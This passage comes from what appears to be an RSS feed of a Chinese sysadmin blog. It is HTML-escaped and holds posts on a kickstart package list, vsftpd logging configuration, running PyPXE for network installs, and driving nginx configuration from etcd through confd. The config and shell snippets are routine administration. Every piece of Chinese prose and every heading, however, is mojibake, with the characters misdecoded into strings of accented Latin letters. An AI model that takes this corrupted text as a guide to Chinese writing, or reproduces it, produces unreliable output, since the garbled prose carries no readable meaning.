&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ipmitool&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lrzsz&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lsof&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mtools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;nc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;nmap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;perl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;perl-CPAN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;procps&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;screen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sysstat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemtap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemtap-client&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemtap-devel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;tcpdump&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;telnet&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vim&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wget&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wsmancli&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;zip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chrony&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;kexec-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ntp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ntpdate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;man&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;acpid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chrony&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;telnet&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%end&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬&#34;&gt;ä¸‰ã€å‡†å¤‡ç”Ÿæˆisoçš„è„šæœ¬&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½ï¼š &lt;a href=&#34;makeiso.sh&#34;&gt;makeiso.sh&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>vsftpdçš„æ—¥å¿—è®¾ç½®</title>
      <link>https://rendoumi.com/posts/20211025-vsftpd/</link>
      <pubDate>Mon, 25 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211025-vsftpd/</guid>
      <description>&lt;p&gt;ä¸ºäº†ç ”å‘æ–¹ä¾¿å°±ç»™ä»–ä»¬åœ¨å†…ç½‘å¼€é€šäº† vsftpd çš„æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æœ java ç›´æ¥æœ‰å°å¥½çš„ ftp library å¯ç”¨ï¼Œå¤§å®¶å°±ç›´æ¥ç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¯¼è‡´ä»»ä½•å•ç‹¬çš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ éƒ½ä¼šèµ·ä¸€ä¸ª ftp å®ä¾‹ï¼Œæ²¡æœ‰å¤ç”¨ ftp çš„ socket é“¾æ¥ ã€‚ç³»ç»ŸæŒ¤å‹äº†å¤§é‡çš„socketè¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;çƒ¦æ¼å•Šï¼Œå‡ºäº†äº‹å°±éº»çƒ¦ã€‚éœ€è¦æŠŠæ—¥å¿—éƒ½è¯¦ç»†è®°ä¸‹æ¥&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vi /etc/vsftp/vsftpd.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dual_log_enable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;YES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;log_ftp_protocol&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;YES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xferlog_enable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;YES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;xferlog_std_format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;NO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dual_log_enable &amp;mdash; å’Œ xferlog_enable ååŒï¼Œä¼šå†™ä¸¤ä»½æ—¥å¿—ï¼Œä¸€ä»½åˆ°/var/log/xferlogï¼Œä¸€ä»½åˆ°/var/log/vsftpd.log&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;log_ftp_protocol &amp;mdash; å’Œ xferlog_enable ååŒï¼ŒåŒæ—¶xferlog_std_formatéœ€è¦è®¾ç½®ä¸ºNOï¼Œè¿™æ ·æ‰€æœ‰çš„ FTP å‘½ä»¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™æ ·æ‰€æœ‰äººçš„æ“ä½œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œå°±åé¡¾æ— å¿§äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>PyPXE-ä¸€ä¸ªç‰›é€¼çš„ä¸€ç«™å¼PXEå®‰è£…åŒ…</title>
      <link>https://rendoumi.com/posts/20211022-pypxe/</link>
      <pubDate>Fri, 22 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211022-pypxe/</guid>
      <description>&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è¦æ­å»ºä¸€ä¸ªæ­£å¼çš„pxeè‡ªåŠ¨è£…æœºç³»ç»Ÿï¼Œéœ€è¦è£… dnsmasq åš dhcp + tftp ï¼Œéœ€è¦ç¼–è¯‘ ipxe æ¥è·å¾— undionly.kpxe ï¼Œéœ€è¦ http æœåŠ¡å™¨æ¥æä¾›èµ„æºä¸‹è½½ï¼Œrepo åŒæ­¥æœåŠ¡æ¥æä¾› repoã€‚ç»„ä»¶éå¸¸å¤šï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿™ä¹ˆå¤šä¹Ÿæ˜¯æœ‰å¿…è¦çš„ï¼Œå› ä¸ºå¯ä»¥æŒç»­æä¾›ä¸€ä¸ªç¨³å®šçš„è£…æœºç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;åœºæ™¯ä¸€æ¢ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºæˆ¿é‡Œï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæƒ³æ­ä¸€å¥—ç¯å¢ƒçš„æ­¥éª¤å°±æ¯”è¾ƒç¹å¤äº†ã€‚&lt;/p&gt;
&lt;p&gt;PyPXE å°±æ˜¯éå¸¸ç®€å•çš„ä¸€ä¸ªç¨‹åºï¼Œå±…ç„¶è‡ªå·±å®ç°äº†ç”¨äº PXE çš„ dhcpã€tftp å’Œ http å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œä¸”æ”¯æŒ iPXEã€‚&lt;/p&gt;
&lt;p&gt;å¤ªç‰›é€¼äº†ï¼Œå‰æå•Šï¼ŒPyPXE æ˜¯åŸºäº Python 2.7 çš„ï¼ŒPython 3.xæ˜¯è¿è¡Œä¸äº†çš„ã€‚&lt;/p&gt;
&lt;p&gt;æƒ³è®©å®ƒè·‘èµ·æ¥è¿˜å¿…é¡»åšä¸€å®šçš„ä¿®æ”¹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½pypxe&#34;&gt;ä¸€ã€ä¸‹è½½PyPXE&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/pypxe/PyPXE.git
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; PyPXE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹è½½å°±è¡Œäº†ï¼Œä¸ç”¨å®‰è£…ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒæ‰‹åŠ¨ç”Ÿæˆconfigjsoné…ç½®æ–‡ä»¶&#34;&gt;äºŒã€æ‰‹åŠ¨ç”Ÿæˆconfig.jsoné…ç½®æ–‡ä»¶&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_SERVER_IP&amp;#34;: &amp;#34;192.168.85.27&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_FILESERVER&amp;#34;: &amp;#34;192.168.85.27&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_OFFER_BEGIN&amp;#34;: &amp;#34;192.168.85.200&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_OFFER_END&amp;#34;: &amp;#34;192.168.85.250&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_SUBNET&amp;#34;: &amp;#34;255.255.255.0&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_ROUTER&amp;#34;: &amp;#34;192.168.85.1&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_DNS&amp;#34;: &amp;#34;114.114.114.114&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_SERVER_PORT&amp;#34;: 67,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_BROADCAST&amp;#34;: &amp;#34;&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_MODE_PROXY&amp;#34;: false,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;DHCP_WHITELIST&amp;#34;: false,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;HTTP_PORT&amp;#34;: 80,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;LEASES_FILE&amp;#34;: &amp;#34;&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;MODE_DEBUG&amp;#34;: &amp;#34;dhcp&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;MODE_VERBOSE&amp;#34;: &amp;#34;&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_BLOCK_DEVICE&amp;#34;: &amp;#34;&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_COPY_TO_RAM&amp;#34;: false,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_COW&amp;#34;: true,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_COW_IN_MEM&amp;#34;: false,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_PORT&amp;#34;: 10809,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_SERVER_IP&amp;#34;: &amp;#34;0.0.0.0&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NBD_WRITE&amp;#34;: false,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NETBOOT_DIR&amp;#34;: &amp;#34;netboot&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;NETBOOT_FILE&amp;#34;: &amp;#34;boot.http.ipxe&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;STATIC_CONFIG&amp;#34;: &amp;#34;&amp;#34;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;SYSLOG_PORT&amp;#34;: 514,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;SYSLOG_SERVER&amp;#34;: null,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;USE_DHCP&amp;#34;: true,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;USE_HTTP&amp;#34;: true,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;USE_IPXE&amp;#34;: true,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;&amp;#34;USE_TFTP&amp;#34;: true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢jsonæ–‡ä»¶æ— æ³•åŠ æ³¨è§£ï¼Œæˆ‘ä»¬æŠŠå®ƒåˆ†ä¸‰éƒ¨åˆ†&lt;/p&gt;</description>
    </item>
    <item>
      <title>ETCD &#43; CONFD &#43; NGINXçš„é…ç½®</title>
      <link>https://rendoumi.com/posts/20211021-etcd_confd_nginx/</link>
      <pubDate>Thu, 21 Oct 2021 13:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211021-etcd_confd_nginx/</guid>
      <description>&lt;p&gt;ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬ä»‹ç»äº† ETCD çš„å®¹å™¨åŒ–ï¼Œæè¿™ä»¶äº‹æƒ…çš„ä¸»è¦ç›®çš„å…¶å®æ˜¯è¦åŠ¨æ€æ›´æ–° Nginx çš„é…ç½®&lt;/p&gt;
&lt;p&gt;è¿™ä¸€ç« æˆ‘ä»¬å°±æ¥é…ç½® confd å’Œ Nginxï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ›´æ–° Nginx é…ç½®çš„ç›®çš„&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…é…ç½®confd&#34;&gt;ä¸€ã€å®‰è£…é…ç½®confd&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½å¹¶å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv confd-0.16.0-linux-amd64 /usr/sbin/confd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x /usr/sbin/confd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨ etcd ä¸­å­˜æ”¾çš„æ ¼å¼å¦‚ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;etcdctl set /nginx/app01/subdomain app1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;etcdctl set /nginx/app01/upstream/app01_1 &amp;#34;192.168.0.1:5601&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/nginx/app01/subdomain &amp;#34;app01&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/nginx/app01/upstream/app01_1 &amp;#34;192.168.0.1:5601&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/nginx/app01/upstream/app01_2 &amp;#34;192.168.0.2:5601&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆ confd çš„é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /etc/confd/&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;conf.d,templates&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF&amp;gt;&amp;gt;/etc/confd/conf.d/nginx.toml
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[template]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;src = &amp;#34;nginx.conf.tmpl&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;dest = &amp;#34;/etc/nginx/conf.d/nginx-auto.conf&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;keys = [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;#34;/nginx/app01/subdomain&amp;#34;,
